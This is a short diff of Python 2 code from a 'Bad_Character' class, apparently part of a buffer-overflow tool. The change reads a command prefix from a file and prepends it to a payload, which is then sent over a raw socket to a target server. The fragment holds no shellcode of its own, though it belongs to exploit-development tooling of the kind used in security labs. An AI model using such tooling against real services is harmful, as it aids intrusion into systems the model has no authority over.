@@ -117,12 +117,14 @@ class Bad_Character:
                    print Banner
                    exit()                        
        def _SOCKET_SOCKET(self):
+              with open('Buffer_Package/.Vulnuble.txt','r') as Command:
+                   command =Command.read().replace('\n','').strip()
               try:
                  try:
                     _socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                     _socket.connect((str(self.server_ip),int( self.server_port)))
                     _socket.settimeout(6)
-                    _socket.send(self.payload+self.file+'\r\n') 
+                    _socket.send(command+self.payload+self.file+'\r\n') 
                     _socket.recv(1023)
                     _socket.close()
                     time.sleep(2)
